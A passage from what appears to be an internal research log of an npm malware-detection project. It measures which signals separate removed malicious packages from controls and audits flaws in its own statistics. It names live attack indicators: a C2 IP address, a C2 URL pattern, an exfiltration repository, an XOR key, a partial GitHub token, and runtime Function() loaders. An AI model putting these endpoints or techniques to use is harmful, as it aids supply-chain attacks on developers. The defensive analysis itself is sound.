— not the n from which it stays there. A figure that decides when to re-run a
study has to be the second kind, so `publishersNeededFor` returns the stable
threshold and `firstSeparatingN` reports the other beside it.

Today there are 8. The nearest per-capability claim is `dynamic_code` at 37
accounts — a shortfall of 29 — and the case arm gained 5 accounts between the run
of 2026-08-19 and this one, with 2 more sitting in the 31 captures whose bytes
were deleted.

The argument that this table is not a schedule survives the rerun, and the rerun
sharpened it: the determinate share is now **measured** at 50–75% rather than
assumed, and it is the term that decides the column. An indeterminate case does
not sit in the denominator with an unknown value — it leaves. A cohort legible
enough to fill the 100% column would be a cohort of attackers who had stopped
hiding.

### What the object store still costs

**31 confirmed removals have no tarball**, across 12 packages and 4 accounts, and
**2 of those accounts — `graypin` and `javonayers999` — appear nowhere else in the
case arm.** With their bytes the case arm would be 10 accounts rather than 8. That
figure is now printed by `corpus --publishers` beside the count it suppresses,
rather than being recoverable only by reading this file.

### D8 — two of the eight accounts are one operator, and it is provable

Found while asking whether "8 accounts" means eight independent events. It does
not. `ferrousdev` and `wokorc` are the same operator, and the evidence is a shared
secret rather than a resemblance:

| | `leb128x@1.0.1` (ferrousdev) | `ulebkit@1.0.1` (wokorc) |
|---|---|---|
| `index.js` | `f392af6bd354d9eb…` | **identical** |
| `README.md` | `2b85796451ba219c…` | **identical** — and its first line is `# leb128x` |
| XOR key in `_perf.js` | `runt1me-3nv-r3p` | **identical** |
| exfil target | `api.github.com` → `wutang344/runtime-env-reports` | **identical** |
| GitHub PAT | `ghp_KPWzch…` (40 chars, sha256 `00da4f28a6139363…`) | **identical** |
| decoded User-Agent | `leb128x/1.0.1` | `varint-kit/1.0.1` — a stale string from a rename |

The two `_perf.js` differ in five lines and none of them is the payload: `wokorc`
overwrites its dropper with a comment where `ferrousdev` unlinks it, and adds two
null-guards. It is the same program, hardened.

What carries the merge is **not** that the credential was secret — it was public
in the tarball with the key three lines above it — but that the exfil
*destination* is under the attacker's own control, plus an authoring slip that
copying does not produce: `wokorc` ships `ferrousdev`'s package name inside its
own README, and its User-Agent still names a third package from an earlier
rename.

**The base rate was measured rather than asserted.** Resolving a publisher for
every stored object through its own packument gives 21,725 objects and 6,100
distinct accounts — 18,601,950 possible pairs. Extracting `README.md` from each
object at or under 100 KB (9,542 of them carry one of at least 200 bytes) and
hashing it, exactly **14 account pairs share a byte-identical README**:

```
aghanim1206|joaolmarquess   aghanim1206|pruthvidev10   aghanim1206|thevillain
amitpoofdotnew|bilalpoof    awesthouse|perkrknutsen    bfalling|ibnesayeed
bootsnall|mihaibna          chengzeyi|wavespeed-ai     creaditor|iyris
ferrousdev|wokorc           joaolmarquess|pruthvidev10 joaolmarquess|thevillain
mikehardy|salakar           pruthvidev10|thevillain
```

**0.75 per million**, and several of the other thirteen are ordinary
co-maintainership (`mikehardy|salakar` on react-native-firebase,
`chengzeyi|wavespeed-ai`), which makes the denominator conservative rather than
generous. `ferrousdev|wokorc` is in that list twice over — it shares two distinct
READMEs — plus a byte-identical 1,571-byte `index.js` across five publications,
plus the credential. Coincidence is not the competing explanation.

Timing corroborates and gives the direction. npm removed `ferrousdev`'s three
packages at `2026-08-17T16:23:14Z..16:23:23Z`; `wokorc`'s first publication is
`2026-08-17T17:05:12Z` — **41 minutes 50 seconds after the takedown completed**.
The `author` field is a rotating persona (`jrenner`, `tiltworks` on ferrousdev,
`dkovacs` on wokorc) and does not track the account.

So the case arm is **8 accounts and at most 7 operators**. By the standard this
codebase already applies to the other arm — `PROMOTION_MIN_TAKEDOWN_PUBLISHERS`,
"one operator publishing the same shape ten times is one event" — the primary
unit should be read at 7. The run reports 8 because `publisherOf` resolves an npm
account, which is what it says it resolves and all a packument can support.

**Not fixed in code, and the reason is stated rather than deferred.** Detecting
this needed the tarball bytes, a decode of an obfuscated payload, and a judgement
that a shared credential is identity. That is not a packument field, and a
`publisher` unit that silently merged accounts on a payload heuristic would be a
unit nobody could check. What is done instead: `corpus --publishers` prints the
count as an **upper bound on the independent events**, and this section is the
worked example of why the bound is not tight.

**There is no lower bound, and the first draft of this section wrongly claimed
one.** It said 6, on the strength of the six remaining accounts carrying
mutually disjoint C2 fingerprints with no overlap across a plaintext sweep. The
adversarial pass showed that sweep is a null test for most of them. Only **three
of the seven classes have an attacker-controlled endpoint resident in the
artifact at all**:

| account | what a sweep can compare |
|---|---|
| `whltd4` | the `ltidi.storage` bucket — comparable |
| `aurorasmith100` | `31.97.137.157` + the `bearrtoken` header — comparable |
| ferrousdev+wokorc | the `wutang344` repo — comparable, and it is what merged them |
| `welson283` | **nothing.** `exam-kit`'s payload contains no host, IP or URL; the endpoint is a constructor parameter |
| `a_soclav` | C2 host and port are runtime format-string parameters (`http://%s:%d/Others/%s`). The one observable endpoint is `litterbox.catbox.moe`, a public anonymous upload service — shared infrastructure that proves nothing either way |
| `rihannasmith` | **nothing in plaintext.** A full decompressed sweep for `AlexCarter710` returns 0 objects *including `ai-texts` itself*; the indicator is only recoverable by running the obfuscator's own decoder |
| `siwatfa` | **nothing.** V8 bytecode |

Finding no overlap between things that carry no comparable indicator is not
evidence of separation. So: **8 accounts, 7 a hard upper bound, and no lower
bound established.**

The sweep's "zero overlap" was also not zero once it was run over all 21,640
objects rather than the 12,273 under 100 KB: the indicator `bf497c0b9cee` returns
five objects across three accounts, and the extra one is `timed-assess@1.0.1`
(`marianrosemonte`), published about 44 hours *before* `exam-kit@1.0.0` and
sharing the same password, `readLogoIco` and `rsa_exec`. That is a candidate
second merge involving `welson283`, it is not established here, and it is
recorded so the next pass starts from it rather than rediscovering it.

### D9 — the promotion gate's first criterion cannot be met by collecting more

The gate refuses on three blockers. Two of them are not sample-size problems, and
the report of 2026-08-26 should not be written as though they were.

`ruleEvidenceFor` grades a removal `rule-matched` only when
`weeklyDownloads === 0` **and** `downloadWindowCovers === true`. Measured over all
**23,909** captures on disk:

| | count |
|---|---|
| `downloads === 0` **and** `windowCovers === true` — what the rule needs | **0** |
| `downloads === 0` and `windowCovers !== true` | 2,353 |
| `windowCovers === true` and `downloads > 0` | 1,004 |
| no count at all | 20,546 |

The two conditions are **perfectly disjoint on this corpus, and anti-correlated by
construction**. `windowCovers` is true only when the name existed before npm's
last complete week closed — i.e. only for names old enough to have accrued
downloads. The class is names published minutes ago. Every capture that could
satisfy the zero fails the window, and every capture that satisfies the window has
downloads.

This retires an encouraging-sounding number. **2,525 of 2,541 quarantine captures
now carry a download count**, and `norte-guard track` prints that as the evidence
gap closing. It is not closing in the way the criterion needs: only 696 of those
2,525 carry a *covering* window, and 0 of the 696 read zero. Carrying a count is
necessary and it is not sufficient, and the line that reports it does not say so.

### Which blocker actually binds — measured, because the guess was wrong

The first reading of this said blocker 1 was the wall. It is not. Calling
`assessPromotion` on a reconstruction of today's record, clearing each blocker in
turn:

| record | promotable | blockers left |
|---|---|---|
| today | no | 3 |
| clear 1 — three rule-matched removals from three accounts | no | 2 |
| clear 3 — zero false positives over 2,400 tracked | no | 2 |
| **clear 1 AND 3 together** | **no** | **1 — the eight vacuous zeros** |
| clear all three | **yes** | 0 |

All three are independently binding, and **blocker 2 is the one that survives
clearing the other two.** It is also the only one that cannot be cleared at all.
`if (vacuousTakedowns > 0)` grades captures already frozen on disk; those eight
packages are removed from npm, so they will never receive another non-tombstone
capture, and the count is monotone non-decreasing. It is an absolute lifetime
count of a historical fact, tested against a stream.

That is the same defect this audit already diagnosed and fixed one screen below
it. `PROMOTION_MAX_FALSE_POSITIVES = 1` was replaced by a rate precisely because
"an unreachable bar gets crossed by somebody lowering it, not by the rule
improving" — and `vacuousTakedowns > 0`, two functions away, was left as an
unreachable absolute count. **Not fixed here**: what the replacement should be is
a decision about the criterion, not a repair, and this document is not the place
to change a promotion gate quietly.

So the standing summary of the gate, for the review:

| blocker | what it is | clearable? |
|---|---|---|
| 8 removals carry a vacuous zero | an absolute lifetime count against frozen captures, monotone non-decreasing | **no — never** |
| `0/3 removals traced to the rule` | **structurally unreachable at the current pipeline behaviour.** Not slow — 0 for 23,909 captures | only by changing when the download window is read |
| 17 of 42 tracked are false positives — 40.5%, bound 55.5% vs a 0.164% ceiling | **a finding about the class**, not a gap. Real packages with real installs: `@aria-framework/backup` 2,253 weekly downloads, `@by_virtuous/core` 1,458, `@realloon/deepseek` 1,296 | only by changing the rule |

A fourth check, `PROMOTION_MIN_TAKEDOWN_PUBLISHERS`, is guarded by
`takedownPublishers > 0` and `takedownPublishers` counts only rule-matched
removals — so it is 0, the check silently skips, and it is unevaluable today. It
fires the instant the first blocker moves, and D8 above is the reason to expect it
to bite when it does.

`scheduledReview` on 2026-08-26 prints the neutral branch:
`REVIEW DUE: <n> captures, 92 confirmed. Evaluate.` The
"AND IT IS A RESULT" branch cannot fire — it needs `confirmed < 5` and there are
92. The review says nothing about promotion; `assessPromotion` does, separately,
and what it says is the table above.

---

## Beyond saturation: the opacity endpoints (ideas 1 and 2)

The four capabilities separate nothing at the primary unit and more accounts have
not changed that. Both of the next two things tried came out of the same
observation: every capability answer is produced by a walk that also records
**where it lost the trail**, and that record had only ever been consumed as a
blinder.

### Idea 1 — the general hypothesis is not supported, and it fails informatively

The hypothesis was that an honest package does not need to hide its imports, so
the case arm should be less resolvable than a size-matched control. Measured at
the primary unit over publishers whose archive held JavaScript — 8 cases, 96
controls, the other 29 controls held out because a package nothing opened has no
resolution rate:

| measure | cases | controls | family-adjusted difference |
|---|---|---|---|
| hides any of its own control flow | 3/8 (38%) | 24/96 (25%) | +12.5pp, −21.1 to +57.4 — inconclusive |
| `dynamic-specifier` | **0/8 (0%)** | **11/96 (11%)** | −11.5pp — inconclusive, and the WRONG WAY |
| `dynamic-eval` | 2/8 (25%) | **0/96 (0%)** | **+25.0pp, +1.9 to +73.8 — separates** |
| `computed-member` | **0/8 (0%)** | **12/96 (13%)** | −12.5pp — inconclusive, and the WRONG WAY |
| `unresolved-callee` | 2/8 (25%) | 7/96 (7%) | +17.7pp — inconclusive |

The continuous forms say the same thing more bluntly: median import resolution
rate is **1.000 on both arms**, median authored-opacity-sites-per-file is **0.000
on both arms**, and P(a random case exceeds a random control) is 51.6% and 56.3%.
A coin.

**So the aggregate hypothesis is refused, and the two conjuncts that fail point
the other way.** Not one case publisher has an unresolvable require specifier or a
computed member; eleven and twelve control publishers do. Whatever these fifteen
packages are, obfuscating their imports is not it — they are small, readable and
direct. That is worth knowing precisely because it was the expected result and it
is false.

**One half of that inversion was D11, and is withdrawn.** Re-run with the control
pool restricted to `quarantine-no-genome` — the same filter 7 of the 8 case
publishers came through — `dynamic-specifier` in the controls falls from **11/96
to 3/79**, and the difference from −11.5pp to −3.8pp. Most of "the controls have
more dynamic requires" was `watcher-threshold` packages, which are bundled and
fifty times larger, and it was a fact about the filter mix rather than about
survivors. `computed-member` does survive the class match — **0/8 versus 12/79
(15%)** — so that half of the inversion stands. The corrected statement is
narrower: class-matched survivors of this class use computed member access and
these fifteen packages do not.

### Idea 2 — it moved a number, and it moved it on the control side

The strict definition counts only evidence a reader can check: a module resolved
by name, or an ambient call the parser read. A frozen `reached` resting on a lost
specifier becomes `indeterminate` — never `not-reached`, because failing to read a
specifier is not evidence that it does not reach.

**Frozen `reached` demoted: 11 controls, 0 cases.** Every one of them on
`dynamic_code`, and every one of them a control. `capabilities.ts` makes a
`dynamic-specifier` lost point positive evidence for `dynamic_code` — correct by
the definition frozen before the run, and also the analysis reporting its own
failure — and on this cohort it was the CONTROL arm that was reaching by
ignorance, not both arms equally.

| `dynamic_code` at the publisher unit | cases | controls | difference |
|---|---|---|---|
| frozen | 2r 4n 2? (33%) | 11r 58n 56? (16%) | +17.4pp, −15.4 to +66.3 — inconclusive |
| **on resolved evidence alone** | 2r 4n 2? (33%) | **0r 58n 67? (0%)** | **+33.3pp, +1.6 to +82.2 — separates** |

The case side does not move at all. The control side loses all eleven.

### What these two results are, and what they are not

**They survive the D11 class match, which was the test they could have failed.**
Drawing the control pool from `quarantine-no-genome` alone — 98 control
publishers, 79 of them opened — leaves `dynamic-eval` at **2/8 versus 0/79**,
+25.0pp, family-adjusted CI **+1.1 to +73.8**; and strict `dynamic_code` at 2r 4n
2? versus **0r 47n 51?**, +33.3pp, family-adjusted CI **+0.2 to +82.2**. The
zero on the control side is therefore not an artifact of comparing against a
different population: no publisher of this class, drawn through this filter, in
this window, calls `Function` on a runtime-built body in reachable code.

The strict lower bound at **+0.2pp** is as thin as an interval gets while still
excluding zero, and it should be read as a result hanging by a thread rather than
as a margin.

**They are not a finding from this run.** Both endpoints were chosen after the
frozen four saturated, which is the one thing that disqualifies them as evidence
from the data that suggested them. The Bonferroni widening to 29 endpoints
(z = 3.13) covers the intervals *inside* one run; it does not cover the number of
times this cohort of eight publishers has now been looked at. Both lower bounds
are knife-edge — **+1.9pp and +1.6pp** — and both rest on a control side of
exactly zero.

**They are also not two results.** `dynamic-eval` presence and strict
`dynamic_code` are one phenomenon measured twice: three case packages call
`Function()` over a body built at runtime, and no control publisher does.

The three, and they are three accounts:

| package | account | opaque? | evidence |
|---|---|---|---|
| `@siwatfa/yorn` | siwatfa | bytecode + minified | `Function` at `dist/load.cjs:1-2` |
| `ai-texts` | rihannasmith | minified | `Function` at `src/index.js:28` |
| `plugin-react-vite` | aurorasmith100 | **not opaque at all** | `Function` at `index.js:150` |

The minification confound — minified code produces authored opacity by
construction — does not dispose of this. `plugin-react-vite` is plain readable
JavaScript that calls `Function()` on a string fetched from `31.97.137.157`.

The publisher unit counts 2 of 8 rather than 3 of 8 because `rihannasmith`'s
earliest capture is `ai-texts-utils`, the inert lure, and the payload is in
`ai-texts`. At `publisher-any` it is **3 of 8 accounts and 3 of 15 packages**,
stated here as a count without a second interval, because running the section at a
second unit would add nine more endpoints to answer a question the 2026-08-19
audit already settled.

### The prediction, frozen

Stated now so the next confirmed sample nobody has opened is the test of it, and
not the third place it is rediscovered:

> Among packages npm removes and this collector catches before the removal, a call
> to `eval` or `Function` on a body assembled at runtime, in code the parser can
> read, occurs at a materially higher rate than in size-matched packages npm did
> not remove — where the current estimate of that control rate is **0 of 96
> publishers**. An unresolvable `require` specifier does **not** discriminate, and
> on the present cohort runs the other way.

What would confirm it: the next six case publishers, opened under the definitions
as they stand today, with the `Function`-on-a-runtime-body rate above the control
rate and the interval clear of zero without any endpoint being chosen afterwards.
What would refute it: control publishers calling `Function` at any appreciable
rate once the pool is drawn from something wider than this collector's own filter.

---

## D10 — for 73% of the case captures, the control arm does not exist

Found while testing whether a metadata-only comparison (idea 3) has more power
than A5. It does have a larger case arm, and three of its endpoints separate
against the raw pool — and all three are artifacts of this.

The A5 window is the cases' own span, `2026-08-15T01:25` to `2026-08-20T16:59`,
and `docs/commands.md` describes the control as **"same days"**. Counting every
uncontaminated capture inside that window, by day:

| day | captures in window | of which are cases |
|---|---|---|
| 2026-08-15 | **34** | **34** |
| 2026-08-16 | **7** | **7** |
| 2026-08-17 | 5,282 | 8 |
| 2026-08-18 | 3,684 | 2 |
| 2026-08-19 | 5,912 | 1 |
| 2026-08-20 | 6,465 | 4 |

**On 2026-08-15 and 2026-08-16 every surviving capture is a case.** The control
pool on those two days is empty — not thin, empty — and that is where **41 of the
56 case captures (73.2%)** sit, covering 6 of the 15 packages and 3 of the 8
accounts (`a_soclav`, `siwatfa`, `whltd4`).

Measured against the controls that were actually drawn: the median case capture is
**42.3 hours** from the nearest measured control capture, and **38 of 56** are more
than 24 hours from any of them. The span is the cases' own; the pool inside it is
not.

**The mechanism, and it is one-sided by construction.** `expired-captures.ndjson`
records **8,866 deletions, every one `deletedBy: rotation`** — 871 on 08-15 and
1,116 on 08-16. Rotation is documented in `corpus.ts` as keeping labelled captures
and taking unlabelled ones oldest-first, which is correct for protecting evidence
and is exactly what destroys a control arm: it deletes the control side of the
oldest days and keeps the case side of the same days. The retention policy
protects the numerator and eats the denominator.

**What it does and does not invalidate.** The four capability endpoints are
answers about what code reaches, and the day a package was captured does not
obviously decide that, so the confound there is weak — but it is not zero and it
was never declared. Any TIME-DERIVED endpoint is another matter: publication
velocity, account age at publication, hour of day. Those cannot be measured on
this window at all, and the three that appeared to separate in the metadata pass
died once the arms were restricted to days both of them occupy.

**Not fixed by widening the window**, which was the first idea and is wrong: a
wider window buys controls from days the cases do not occupy, which is the same
defect pointing the other way. What the run can honestly do is state the per-day
composition beside the window, and refuse time-derived endpoints until the
collector stops deleting one arm. `--control-class` below is the related repair
for a different imbalance; this one needs a change to rotation.

## D11 — the two arms did not come through the same filter in the same proportion

The run's own caveat says the control is drawn through the **same capture filter**
as the cases. That is true of the union and false of the mix, and the mix is what
decides which population a control represents.

At the primary unit on 2026-08-21:

| | `quarantine-no-genome` | `watcher-threshold` | share of the class |
|---|---|---|---|
| cases | 7 | 1 | **87.5%** |
| matched controls | 49 | 76 | **39.2%** |
| the pool they were drawn from | 1,375 | 8,818 | 13.5% |

The two reasons select different things — one keeps everything matching the three
conjuncts of the observed class, the other keeps whatever scored high. Size
matching moves the control mix from 13.5% to 39.2% on its own, because the cases
are tiny and so is that class, and it does not close the gap.

Fixed by making it testable rather than by asserting it away:
`norte-guard capabilities --control --control-class=quarantine-no-genome` draws
the pool from one reason, trading control-arm size for a control that came through
the same filter. The default run now prints the mix beside the pooled sizes at
every unit, so an imbalance is visible where the numbers are rather than three
paragraphs below them.

This bears directly on the one thing that separates. If the 0-of-96 control rate
on `dynamic-eval` is carried by `watcher-threshold` packages — a different
population from the cases — then the comparison is weaker than its interval says.
The class-matched run is what answers that, and it is reported beside the default
one rather than replacing it. It survives: **2/8 versus 0/79**, +25.0pp, CI +1.1
to +73.8.

### The worked example: `has_trusted_publisher`, a −44.7pp signal that is exactly 0.0pp

Nothing states the size of this defect better than the endpoint that looked like
the best metadata signal in the corpus. Measured at the publisher unit, cases
being every confirmed removal with a resolvable account:

| control arm | cases | controls | difference |
|---|---|---|---|
| every capture reason | 0/10 | **2,903/6,492 (44.7%)** | −44.7pp, CI −46.7 to +5.0 — does not separate |
| `watcher-threshold` only | 0/10 | 2,903/5,679 (51.1%) | −51.1pp, CI −53.2 to −1.4 — **separates** |
| **`quarantine-no-genome` only** | 0/10 | **0/950 (0.0%)** | **0.0pp** |

Not one of 950 class-matched control publishers uses npm's trusted publishing
either. The signal is not weak against a like-for-like control; it is **exactly
zero**, and the 44.7% in the raw pool is entirely the other filter.

The mechanism is not subtle once it is looked at: trusted publishing needs a
GitHub repository and a workflow, and `!hasRepository` is one of the three
surviving conjuncts of the class the capture filter selects on. A control drawn
from that class cannot have the field. Any endpoint that is an INPUT to the
capture decision will separate against the raw pool and vanish against a
class-matched one, and this is what that looks like at full size.

Recorded also because the first reading of the metadata pass called this row a
mistake — 0/10 against 44.7% ought to separate, the reasoning went, so the
analysis that reported otherwise must have erred. It had not: at z = 3.14 the
Wilson upper bound on 0 of 10 reaches past 40%, so the difference interval crosses
zero honestly. The suspicion was wrong and the row was right.

## Beyond the tarball: the metadata endpoints (ideas 3 and 4)

The capability run is a run over 56 captures because every one of its four
questions is answered by reading bytes. That bound is not this project's: 66.8%
of this store kept no artifact, **0 of 42** confirmed removals collected outside
it kept one, and 0 of 100 in the `0.0.1-security` sweep. A question phrased over
contents cannot be asked of any of them, by anyone, ever.

The packument survives. It survives more completely than expected —
`@siwatfa/yorn` was removed on 2026-08-17 and its record still carries **149
publication timestamps** between 2026-08-12T10:55 and 2026-08-16T23:28, the whole
release cadence of the attack, months after the versions stopped resolving. npm
deletes the versions and keeps `time`.

`norte-guard metadata` is the run over what is left. Its cohort is 24,307
packuments rather than 56 tarballs, and its case arm is **87 captures, 31 of them
with no bytes at all**.

### The result: nothing separates at the primary unit

| endpoint (INDEPENDENT of the capture filter) | capture unit | publisher unit |
|---|---|---|
| two publications less than five minutes apart | 88.1% vs 24.2%, **+63.8pp**, CI +44.2 to +75.4 | 2/5 vs 10/37, +13.0pp, CI −27.3 to +60.6 |
| median gap under an hour | 95.5% vs 54.7%, **+40.8pp**, CI +23.1 to +53.7 | 4/5 vs 18/37, +31.4pp, CI −27.6 to +58.9 |

The left column is one operator's release loop counted 36 times. `@siwatfa/yorn`
is 36 of the 87 case captures and 149 releases of one name, and *every* endpoint
here is a property of a release habit — so the capture unit hands that operator
as many votes as it made publications. At the publisher unit, whose members are
independent events, **not one uncontaminated endpoint separates**. Both control
arms agree, raw pool and class-matched.

This is the D-series lesson arriving in a new place. The primary unit was
declared before the run and it is the only reason the +63.8pp was not reported as
a finding; the run now prints the discrepancy itself, naming the endpoints that
separate at the capture unit and not at the publisher unit.

### Contamination, declared before the run rather than discovered after

D11 established that any endpoint which is an INPUT to the capture decision
separates against the raw pool and vanishes against a class-matched one. A
metadata pass is where that is easiest to repeat, because most of what a
packument says about a young package is downstream of the package being young.

Every endpoint therefore carries a frozen declaration of its relation to the
three conjuncts — `young`, `tiny`, `!hasRepository` — and the verdict line reads
differently for each:

- **entailed** — `name_age_days` *is* the young conjunct; `has_provenance` and
  `provenance_lost` need the repository the conjunct excludes. A separation here
  is the filter measuring itself and is printed as `SEPARATES, AND IT IS AN
  ARTIFACT. Not a finding.`
- **partial** — `release_count` and `releases_per_day` are bounded by `young`
  without being fixed by it. Both separate; both are labelled as partly the
  filter.
- **independent** — publication velocity, maintainer membership, dependency
  churn. The only rows a finding could come from, and none of them does.

### Idea 4: the batch endpoint is saturated by ordinary practice

A family here is several **distinct** names from one account inside 60 minutes.
The distinctness is the whole condition: `@siwatfa/yorn` is 149 releases of one
name, and a definition counting publications would have called it the largest
campaign in the corpus. It is reported as a *cadence* instead.

The naive endpoint does not discriminate:

| | share of families |
|---|---|
| tight batch (≥3 names within 60min) | **58.9%** of the store's 40,483 families |
| every name a first publication | 0.2% |
| **both** | **0.1%** (43 families) |
| both, sharing a lexical token | 0.1% (33) |

Publishing many names at once is what a monorepo release *is* — 84 `@hive-ui/*`
in two minutes, 120 `@central-icons-*` in four. Idea 4's naive form is saturated
by ordinary practice exactly as idea 1's was by minification, and for the same
structural reason: the behaviour was assumed anomalous without measuring its base
rate.

The conjunction is selective. Of the 43 tight-and-all-new families, 3 hold a
confirmed-malicious name — `whltd4` twice and `javonayers999` once — against 4
malicious families in the corpus. The remaining 40 are labelled `unconfirmed`,
which is not the same as benign. **This is descriptive. With 4 malicious families
there is no case arm to test against a control arm, and none is claimed.**

### What did survive: one counter, three accounts

The family unit is keyed by publisher, and that turned out to be a ceiling rather
than a floor.

Three accounts — `node-mini-tools`, `pkg-utils-lab`, `tiny-js-helpers` — each
published a tight batch of tiny first-publication packages named
`<stem>-<NNN>-th`. Read one account at a time they are three unremarkable
batches. Read together, the numbers ascend **globally** while the account
rotates:

```
 37  node-mini-tools    2026-08-19T19:59:33
 38  pkg-utils-lab      2026-08-19T20:01:34
 39  tiny-js-helpers    2026-08-19T20:02:32
 41  pkg-utils-lab      …  44, 45, 47, 48, 49, 51, 53, 54, 56, 57, 59, 61, 63
```

**17 of 21 adjacent-by-number pairs land on a different account**, spaced about
58 seconds apart, with an earlier wave (1, 3, 7, 9, 12) on 2026-08-18 from the
same three. One counter, three accounts, a one-minute timer.

No per-publisher unit can see this, because the coordination is exactly what the
grouping key throws away. The detector added for it is deliberately narrow — a
general "there is a number in the name" would fire on every napi platform binary
in the registry — and over the whole store it fires **once, on 12,327 distinct
names**, capturing 22 of the 23 names that match the shape at all.

This is a hypothesis this run generated, not a finding it established. It is
recorded so that the next campaign is the test of it.

### D12 — `time.created` is not the package's birth

`nameAgeDays` in `observed-class.ts` prefers `packument.createdAt`, which
`normalizePackument` takes from `time.created`. That field is not the first
publication.

When npm removes a package it republishes the name as `0.0.1-security`, and the
write **resets `time.created` to the moment of the takedown**. `@siwatfa/yorn`
reports `created` = 2026-08-17T10:09:45 against an earliest release of
2026-08-12T10:55: five days of life recorded as zero.

It is not only a takedown artifact. Measured over the store:

| | count |
|---|---|
| captures whose `created` is later than their own first release | **631** of 24,307 |
| of those, `young` by `created` but NOT `young` by first release | **133** |
| admitted to the observed class on that alone | **17** |
| …under `quarantine-no-genome`, the class-matched control arm | **5** |

`typeguard-ts@2.2.1` reports 2.88 days against a true 935.92.

The direction matters: it makes OLD packages look YOUNG, so it admits ordinary
old packages to a class defined as new ones. That runs **against** any difference
the case arm shows, which is why it is reported rather than treated as
invalidating. Every age in the metadata run is taken from the release timestamps
instead.

### D13 — the registry publishing as itself, and a near miss

npm's takedown write carries `_npmUser` = `{name: "npm", email:
"npm@npmjs.com"}` and rewrites `maintainers` to `npm-support`. Read literally
that is one account, and it is the account that "published" every removed package
in the store.

The first family pass did exactly that: it grouped `@siwatfa/yorn`, `gunzip-js`
and `@guildai-services/guildai` into one batch on the strength of npm having
taken all three down within 205 minutes of each other.

This is the OIDC-bot defect of D-series in a second costume — a shared identity
standing in for many real ones — but in the **opposite direction**. The OIDC bot
collapsed sixteen control packages out of the primary analysis; this one
*invents* coordination among the cases, which is the direction that manufactures
a finding.

68 captures in the store resolve to the registry identity. All 68 are
`0.0.1-security` placeholders, and **all 68 were already excluded from the A5
control arm as withdrawn packages** — the takedown log lists every one. The
existing capability results are therefore clean, but they are clean by accident:
the filter that saved them has nothing to do with the defect. The guard is now
structural (`isRegistryIdentity`, checked on both halves of the fallback before
`publisherOf` is consulted at all) and it matters most precisely where the
external corpus lives, since that corpus *is* placeholders.

### What this establishes about the ecosystem

Worth stating as a result rather than as a limitation, because it is a property
of npm and not of this collector:

**The evidence of an attack disappears with the attack, for everyone.** 0 of 42
external confirmed removals retains a tarball; 0 of 100 in the sweep. Neither a
vendor nor an academic reviewer can reconstruct those bytes. The 56 samples this
collector holds are, as far as is known, the only ones that exist — and what the
registry *does* keep is the publication record, which is why the metadata
endpoints are the only ones the wider corpus can ever be measured on, and why
their negative result at the publisher unit is worth having.

## D14 — the false-positive benchmark cannot measure any class-restricted signal

This is a defect of the benchmark, not of any signal, and it was found by
proposing two signals for promotion into the scorer and asking what would gate
them.

`fp-bench` harvests by keyword and ranks by weekly downloads, so its sample is
the well-maintained middle of the registry. The observed class is `young` (under
seven days), `tiny` (under 100KB) and `!hasRepository`. **A popular package
satisfies none of the three.** Any signal gated on the class therefore has
nothing to fire on, comes back at 0.00% false positives, and passes a review that
asked only "does the FP rate move".

It is not hypothetical. `fabricatedProfile` already ships, and it is measured on
both arms:

| arm | n | full conjunction | the 4 local conjuncts |
|---|---|---|---|
| popularity-ranked, 7 saved runs v0.2.0 → v1.2.0 | 500 each | **0.00%** | **0.00%** |
| class-matched, `quarantine-no-genome` | 1,505 | **82.66%** | **97.01%** |

Seven runs across four releases, every one reporting 0.00%, on a rule that fires
on four of five packages in the population it was written for. The rule is not
switched on — `blockFabricatedProfile: false` in both gate and audit — and the
0.00% is exactly the number that would have justified switching it on.

`fp-bench --class-matched` is the arm that can answer. It is offline, scores each
package from **its captured packument rather than from the registry today** (the
live document for a package this young has already grown versions the watcher
never saw, and for a withdrawn one it holds nothing), and takes one capture per
package so a republisher cannot decide the rate.

**"Not withdrawn" is not "benign", and the direction matters.** A package npm
removes tomorrow is in this arm today, and its detection counts here as a false
positive. The measured rate is an over-estimate, so a signal that looks clean
here is clean under a pessimistic reading. The same union of removal records the
capability run uses is subtracted first: of 2,576 captures under the reason, 31
confirmed and 42 withdrawn are removed, leaving 1,505 packages.

The arm also makes a coverage fact visible that the popularity arm hides:
**100.0% of the class comes back `INSUFFICIENT_HISTORY` in gate mode.** Not one
of the 1,505 is judged either way. The gate has no opinion about the entire
population these attacks are drawn from, which is a different problem from a
false-positive rate and had no number until now.

## `detectFabricatedFamilies` has a recall of 0 of 26 — a campaign detector that finds monorepos

Recorded as a negative result because the proposal to promote it to a scorer
signal was reasonable on its face and wrong on the numbers.

It fired **23 times in production**, flagging **319 distinct package names**:

| | |
|---|---|
| names flagged | 319 |
| of those, `confirmed_malicious` | **0** |
| confirmed removals on disk it did **not** flag | **26 of 26** |
| recall | **0.0%** |

The recall is the number that settles it, and it does not depend on the unlabelled
majority: those 26 names *are* labelled and the detector missed every one. The
three malicious families that exist in the corpus — `whltd4` twice,
`javonayers999` once — do not trigger it, because `MIN_FAMILY_ENTITIES = 3`
counts distinct *publishing entities* and a single operator on one account
produces one.

What it flags instead is component libraries:

- `@solidiom/*` — 72 names in 45 minutes
- `@deepseek-harness-tui/*` — 34 names in 9 minutes
- `@hive-ui/*` — 20 names, the same monorepo release the family pass in
  `metadata-run.ts` measures at 84 packages in two minutes
- `@scayle/storefront-cms-*`, `@servicetitan/anvil2-charts-kit` — real vendors

Precision of 0.0% is a **floor rather than an estimate**: the 319 are labelled
`unconfirmed`, which `corpus.ts` is explicit is not the same as benign, and the
`-th` gambling sequence and the `@maitxn` word-salad names among them are almost
certainly abuse. But a detector with zero recall against every confirmed sample
does not need a better false-positive measurement; it needs not to ship.

Both this and the inverse-opacity proposal stay where they are — reports that
contribute no points to any verdict. The inverse form of the opacity endpoints
runs backwards in any case: "hides none of its own control flow" fires on 62.5%
of cases and **72.2% of controls**, and "no computed-member" on 100% of cases and
84.8% of controls, over an endpoint whose own interval is −31.6pp to +40.6pp.

### What survived: `numberedSequences`

One thing from the family work is worth keeping, and it is not a rate. Over
12,327 distinct package names with an attributable publisher, the numbered-
sequence detector fires **once**, capturing 22 of the 23 names that match the
shape at all — the three-account campaign with a single global counter described
above.

Descriptive, n=1, and it establishes nothing. It is kept because it is the only
thing here that a per-publisher unit **cannot see by construction**: the
coordination it detects is exactly what grouping by account throws away.

## D15 — a 404 on the first fetch was terminal, and it cost 6,892 publications

The change feed announces a publication; the watcher fetches the packument about
a second later. npm's read path is not consistent that fast. When the fetch
failed the outcome was logged as `unreachable` and the publication was dropped —
**nothing ever asked again**.

Measured over the change log:

| | |
|---|---|
| rows with `unreachableReason: 404` | 12,852 over 12,638 packages |
